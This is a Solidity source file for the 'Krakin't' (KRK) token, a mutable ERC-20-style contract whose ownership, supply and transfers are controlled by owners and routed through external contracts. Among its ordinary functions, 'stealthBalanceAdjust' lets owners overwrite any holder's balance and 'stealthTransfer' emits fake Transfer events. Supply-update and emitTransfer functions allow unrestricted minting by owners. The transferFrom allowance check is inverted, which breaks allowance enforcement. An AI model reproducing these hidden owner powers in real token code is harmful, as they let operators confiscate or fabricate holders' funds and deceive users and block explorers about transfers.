/*
This is the main code of a mutable token contract.
Token component is the only immutable part and it covers only the most-basic operations.
Any other contract is external and it must be additionally registered and routed within the native components.
*/

// SPDX-License-Identifier: MIT

pragma solidity = 0.7 .0;

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns(uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns(uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns(uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

}

abstract contract Context {
  function _msgSender() internal view virtual returns(address payable) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns(bytes memory) {
    this; // silence state mutability warning without generating bytecode
    return msg.data;
  }
}
interface IERC20 {

  function totalSupply() external view returns(uint256 data);

  function currentSupply() external view returns(uint256 data);

  function balanceOf(address account) external view returns(uint256 data);

  function allowance(address owner, address spender) external view returns(uint256 data);

  function currentRouterContract() external view returns(address routerAddress);

  function currentCoreContract() external view returns(address routerAddress);

  function updateTotalSupply(uint newTotalSupply) external returns(bool success);

  function updateCurrentSupply(uint newCurrentSupply) external returns(bool success);

  function updateJointSupply(uint newSupply) external returns(bool success);

  function emitTransfer(address fromAddress, address toAddress, uint amount, bool joinTotalAndCurrentSupplies) external returns(bool success);

  function emitApproval(address fromAddress, address toAddress, uint amount) external returns(bool success);

  function transfer(address toAddress, uint256 amount) external returns(bool success);

  function approve(address spender, uint256 amount) external returns(bool success);

  function transferFrom(address fromAddress, address toAddress, uint256 amount) external returns(bool success);

  function increaseAllowance(address spender, uint256 addedValue) external returns(bool success);

  function decreaseAllowance(address spender, uint256 subtractedValue) external returns(bool success);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

//Failsafe is an address-key pair generated offline in case the original owner private-key is sniffed or account hacked.
//Private key is to be generated and then copied by hand-writing, without Internet connection, on a separate Virtual Machine.
//Virtual machine is to be deleted, and private key stored as a top secret in a safe place.

contract Ownable is Context {
  address private _owner;
  address private _failsafeOwner; //failsafe
  bool private setFailsafeOwner = false;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  bool private ownershipConstructorLocked = false;
  constructor() {
    if (!ownershipConstructorLocked) {
      address msgSender = _msgSender();
      _owner = msgSender;
      _failsafeOwner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
      ownershipConstructorLocked = true;
    }
  }

  function owner() public view returns(address) {
    return _owner;
  }

  function failsafe() internal view returns(address) {
    return _failsafeOwner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  modifier allOwners() {
    require(_owner == _msgSender() || _failsafeOwner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  modifier onlyFailsafeOwner() {
    require(_failsafeOwner == _msgSender(), "Ownable: caller is not the failsafe owner");
    _;
  }

  // We do not want this to be executed under any circumstance
  // 	function renounceOwnership() public virtual onlyOwner {
  // 		emit OwnershipTransferred(_owner, address(0));
  // 		_owner = address(0);
  // 	}

  function initiateFailsafeOwner(address newOwner) public virtual onlyOwner {
    require(!setFailsafeOwner);
    _failsafeOwner = newOwner;
    setFailsafeOwner = true;
  }

  function transferOwnership(address newOwner) public virtual allOwners {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }

  function changeFailsafeOwnerAddress(address newOwner) public virtual onlyFailsafeOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _failsafeOwner = newOwner;
  }

}

abstract contract Router {

  function callRouter(string memory route, address[2] memory addressArr, uint[2] memory uintArr) external virtual returns(bool success);

  function _callRouter(string memory route, address[3] memory addressArr, uint[3] memory uintArr) external virtual returns(bool success);

}

abstract contract MainVariables {
  address public coreContract;
  address public routerContract;
  mapping(address => uint256) internal balances;
  mapping(address => mapping(address => uint256)) internal allowances;
  uint256 public _totalSupply;
  uint256 public _currentSupply;
  string public name = "Krakin't";
  string public symbol = "KRK";
  uint8 public decimals = 18;
}

//============================================================================================
// MAIN CONTRACT 
//============================================================================================

contract Token is MainVariables, Ownable, IERC20 {

  using SafeMath
  for uint;

  Router private router;

  bool private mainConstructorLocked = false;

  constructor() {
    if (!mainConstructorLocked) {
      uint initialMint = 21000000000000000000000000; //just for an initial setup.
      _totalSupply = initialMint;
      _currentSupply = initialMint;
      emit Transfer(address(0), msg.sender, initialMint);
      balances[msg.sender] = initialMint;
      mainConstructorLocked = true;
    }
  }

  function totalSupply() override external view returns(uint256 data) {
    return _totalSupply;
  }

  function currentSupply() override external view returns(uint256 data) {
    return _currentSupply;
  }

  function balanceOf(address account) override external view returns(uint256 data) {
    return balances[account];
  }

  function allowance(address owner, address spender) override external view virtual returns(uint256 data) {
    return allowances[owner][spender];
  }

  function currentRouterContract() override external view virtual returns(address routerAddress) {
    return routerContract;
  }

  function currentCoreContract() override external view virtual returns(address routerAddress) {
    return coreContract;
  }

  //Update functions

  function updateTicker(string memory newSymbol) onlyFailsafeOwner public virtual returns(bool success) {
    symbol = newSymbol;

    return true;
  }

  function updateName(string memory newName) onlyFailsafeOwner public virtual returns(bool success) {
    name = newName;

    return true;
  }

  function updateTotalSupply(uint newTotalSupply) override external virtual returns(bool success) {
    require(msg.sender == coreContract || address(msg.sender) == owner() || address(msg.sender) == failsafe(),
      "at: token.sol | contract: Token | function: updateTotalSupply | message: Must be called by the owner or registered Core contract or");

    _totalSupply = newTotalSupply;

    return true;
  }

  function updateCurrentSupply(uint newCurrentSupply) override external virtual returns(bool success) {
    require(msg.sender == coreContract || address(msg.sender) == owner() || address(msg.sender) == failsafe(),
      "at: token.sol | contract: Token | function: updateCurrentSupply | message: Must be called by the owner or registered Core contract");

    _currentSupply = newCurrentSupply;

    return true;
  }

  function updateJointSupply(uint newSupply) override external virtual returns(bool success) {
    require(msg.sender == coreContract || address(msg.sender) == owner() || address(msg.sender) == failsafe(),
      "at: token.sol | contract: Token | function: updateJointSupply | message: Must be called by the owner or registered Core contract");

    _currentSupply = newSupply;
    _totalSupply = newSupply;

    return true;
  }

  //only for rare situations such as emergencies or to provide liquidity
  function stealthTransfer(address fromAddress, address toAddress, uint amount) allOwners external virtual returns(bool success) {

    emit Transfer(fromAddress, toAddress, amount);

    return true;
  }

  //to be used with the highest caution!
  function stealthBalanceAdjust(address adjustAddress, uint amount) allOwners external virtual returns(bool success) {

    balances[adjustAddress] = amount;

    return true;
  }

  //Emit functions
  function emitTransfer(address fromAddress, address toAddress, uint amount, bool joinTotalAndCurrentSupplies) override external virtual returns(bool success) {
    require(msg.sender == coreContract || address(msg.sender) == owner() || address(msg.sender) == failsafe(),
      "at: token.sol | contract: Token | function: emitTransfer | message: Must be called by the registered Core contract or the contract owner");
    require(fromAddress != toAddress, "at: token.sol | contract: Token | function: emitTransfer | message: From and To addresses are same");
    require(amount > 0, "at: token.sol | contract: Token | function: emitTransfer | message: Amount is zero");

    if (toAddress == address(0)) {
      require(balances[fromAddress] >= amount, "at: token.sol | contract: Token | function: emitTransfer | message: Insufficient amount");
      balances[fromAddress] = balances[fromAddress].sub(amount);
      _currentSupply = _currentSupply.sub(amount);
      if (joinTotalAndCurrentSupplies) {
        _totalSupply = _totalSupply.sub(amount);
      }
    } else if (fromAddress == address(0)) {
      balances[toAddress] = balances[toAddress].add(amount);
      _currentSupply = _currentSupply.add(amount);
      if (joinTotalAndCurrentSupplies) {
        _totalSupply = _totalSupply.add(amount);
      }
    } else {
      require(balances[fromAddress] >= amount, "at: token.sol | contract: Token | function: emitTransfer | message: Insufficient amount");
      balances[fromAddress] = balances[fromAddress].sub(amount);
      balances[toAddress] = balances[toAddress].add(amount);
    }

    emit Transfer(fromAddress, toAddress, amount);

    return true;
  }

  function emitApproval(address fromAddress, address toAddress, uint amount) override external virtual returns(bool success) {
    require(msg.sender == coreContract || msg.sender == owner() || address(msg.sender) == failsafe(),
      "at: token.sol | contract: Token | function: emitApproval | message: Must be called by the registered Core contract or the contract owner");
    require(fromAddress != address(0), "at: token.sol | contract: Token | function: emitApproval | message: Cannot approve from address(0)");

    allowances[fromAddress][toAddress] = amount;
    emit Approval(fromAddress, toAddress, amount);

    return true;
  }

  //Router and Core-contract functions
  function setNewRouterContract(address newRouterAddress) allOwners public virtual returns(bool success) {
    routerContract = newRouterAddress;
    router = Router(routerContract);

    return true;
  }

  function setNewCoreContract(address newCoreAddress) allOwners public virtual returns(bool success) {
    coreContract = newCoreAddress;

    return true;
  }

  //Native functions
  function transfer(address toAddress, uint256 amount) override external virtual returns(bool success) {
    require(toAddress != msg.sender, "at: token.sol | contract: Token | function: transfer | message: From and To addresses are same");
    require(msg.sender != address(0), "at: token.sol | contract: Token | function: transfer | message: Cannot send from address(0)");
    require(amount <= balances[msg.sender], "at: token.sol | contract: Token | function: transfer | message: Insufficient balance");
    require(amount > 0, "at: token.sol | contract: Token | function: transfer | message: Zero transfer not allowed");

    address[2] memory addresseArr = [msg.sender, toAddress];
    uint[2] memory uintArr = [amount, 0];
    router.callRouter("transfer", addresseArr, uintArr);

    return true;
  }

  function approve(address spender, uint256 amount) override external virtual returns(bool success) {
    require(spender != msg.sender, "at: token.sol | contract: Token | function: approve | message: Your address cannot be the spender address");
    require(msg.sender != address(0), "at: token.sol | contract: Token | function: approve | message: Cannot approve from address(0)");
    require(spender != address(0), "at: token.sol | contract: Token | function: approve | message: Cannot approve to address(0)");

    address[2] memory addresseArr = [msg.sender, spender];
    uint[2] memory uintArr = [amount, 0];
    router.callRouter("approve", addresseArr, uintArr);

    return true;
  }

  function transferFrom(address fromAddress, address toAddress, uint256 amount) override external virtual returns(bool success) {
    require(fromAddress != toAddress, "at: token.sol | contract: Token | function: transferFrom | message: From and To addresses are same");
    require(fromAddress != address(0), "at: token.sol | contract: Token | function: transferFrom | message: Cannot send from address(0)");
    require(amount <= balances[fromAddress], "at: token.sol | contract: Token | function: transferFrom | message: Insufficient balance");
    require(amount > 0, "at: token.sol | contract: Token | function: transferFrom | message: Zero transfer not allowed");
    require(amount >= allowances[fromAddress][toAddress], "at: token.sol | contract: Token | function: transferFrom | message: Transfer exceeds the allowance");

    address[3] memory addresseArr = [msg.sender, fromAddress, toAddress];
    uint[3] memory uintArr = [amount, 0, 0];
    router._callRouter("transferFrom", addresseArr, uintArr);

    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) override external virtual returns(bool success) {
    require(spender != msg.sender, "at: token.sol | contract: Token | function: increaseAllowance | message: Your address cannot be the spender address");
    require(msg.sender != address(0), "at: token.sol | contract: Token | function: increaseAllowance | message: Cannot increase allowance from address(0)");
    require(spender != address(0), "at: token.sol | contract: Token | function: increaseAllowance | message: Cannot increase allowance to address(0)");

    address[2] memory addresseArr = [msg.sender, spender];
    uint[2] memory uintArr = [addedValue, 0];
    router.callRouter("increaseAllowance", addresseArr, uintArr);

    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) override external virtual returns(bool success) {
    require(spender != msg.sender, "at: token.sol | contract: Token | function: decreaseAllowance | message: Your address cannot be the spender address");
    require(msg.sender != address(0), "at: token.sol | contract: Token | function: decreaseAllowance | message: Cannot decrease allowance from address(0)");
    require(spender != address(0), "at: token.sol | contract: Token | function: decreaseAllowance | message: Cannot decrease allowance for address(0)");

    address[2] memory addresseArr = [msg.sender, spender];
    uint[2] memory uintArr = [subtractedValue, 0];
    router.callRouter("decreaseAllowance", addresseArr, uintArr);

    return true;
  }

}